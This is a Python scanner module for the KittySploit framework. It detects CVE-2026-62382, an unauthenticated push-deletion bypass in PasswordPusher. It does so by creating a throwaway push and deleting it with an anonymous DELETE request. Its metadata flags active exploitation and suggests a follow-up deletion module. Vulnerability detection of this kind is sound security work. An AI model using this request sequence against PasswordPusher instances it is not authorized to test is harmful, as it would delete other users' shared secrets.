#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""PasswordPusher anonymous push deletion via nil==nil ownership bypass (CVE-2026-62382)."""

import json
import secrets

from kittysploit import *
from lib.protocols.http.http_client import Http_client

class Module(Scanner, Http_client):
    __info__ = {
        "name": "PasswordPusher CVE-2026-62382 anonymous push delete detect",
        "description": (
            "Detects CVE-2026-62382 in PasswordPusher v1.45.11 through v2.9.5: anonymous pushes "
            "can be deleted without auth when deletable_by_viewer is false (Ruby nil==nil ownership "
            "check). Creates a throwaway push and attempts DELETE /p/{token}.json."
        ),
        "author": ["KittySploit Team"],
        "severity": "medium",
        "cve": "CVE-2026-62382",
        "references": [
            "https://nvd.nist.gov/vuln/detail/CVE-2026-62382",
            "https://github.com/pglombardo/PasswordPusher/security/advisories/GHSA-jf2m-hpj9-4qx2",
            "https://github.com/projectdiscovery/nuclei-templates/blob/main/http/cves/2026/CVE-2026-62382.yaml",
        ],
        "modules": [
            "auxiliary/admin/http/passwordpusher_cve_2026_62382_anonymous_delete",
        ],
        "tags": [
            "web",
            "scanner",
            "passwordpusher",
            "authz-bypass",
            "cve-2026-62382",
        ],
        "agent": {
            "risk": "active",
            "effects": ["network_probe", "active_exploitation"],
            "expected_requests": 3,
            "reversible": True,
            "approval_required": True,
            "produces": ["tech_hints", "risk_signals", "exploit_paths"],
            "cost": 1.0,
            "noise": 0.35,
            "value": 0.9,
            "requires": {
                "tech_hints_any": ["passwordpusher", "password-pusher"],
            },
            "chain": {
                "produces_capabilities": [
                    {"capability": "authz_bypass", "from_detail": "anonymous push delete"},
                ],
                "suggested_followups": [
                    "auxiliary/admin/http/passwordpusher_cve_2026_62382_anonymous_delete",
                ],
            },
        },
    }

    def _looks_like_passwordpusher(self) -> bool:
        response = self.http_request(method="GET", path="/", allow_redirects=True)
        if not response or response.status_code != 200:
            return False
        body = (response.text or "").lower()
        return "password pusher" in body or "passwordpusher" in body or "/p.json" in body

    def _probe_delete_bypass(self) -> bool:
        marker = f"ks-{secrets.token_hex(6)}"
        payload = {
            "password": {
                "payload": marker,
                "deletable_by_viewer": False,
                "expire_after_views": 10,
            }
        }
        create = self.http_request(
            method="POST",
            path="/p.json",
            headers={
                "Content-Type": "application/json",
                "Accept": "application/json",
            },
            data=json.dumps(payload),
            allow_redirects=False,
        )
        if not create or create.status_code != 201:
            return False
        try:
            body = json.loads(create.text or "{}")
        except json.JSONDecodeError:
            return False
        token = (body.get("url_token") or "").strip()
        if not token:
            return False
        delete = self.http_request(
            method="DELETE",
            path=f"/p/{token}.json",
            headers={"Accept": "application/json"},
            allow_redirects=False,
        )
        if not delete or delete.status_code != 200:
            return False
        text = delete.text or ""
        return '"expired":true' in text.replace(" ", "") and '"deleted":true' in text.replace(" ", "")

    def run(self):
        if not self._looks_like_passwordpusher():
            home = self.http_request(method="POST", path="/p.json", headers={"Accept": "application/json"}, data="{}", allow_redirects=False)
            if not home or home.status_code not in (201, 400, 422):
                return False
        if not self._probe_delete_bypass():
            return False
        self.set_info(
            severity="medium",
            reason="PasswordPusher CVE-2026-62382 — unauthenticated anonymous push deletion",
            path="/p/{url_token}.json",
            cve="CVE-2026-62382",
        )
        return True
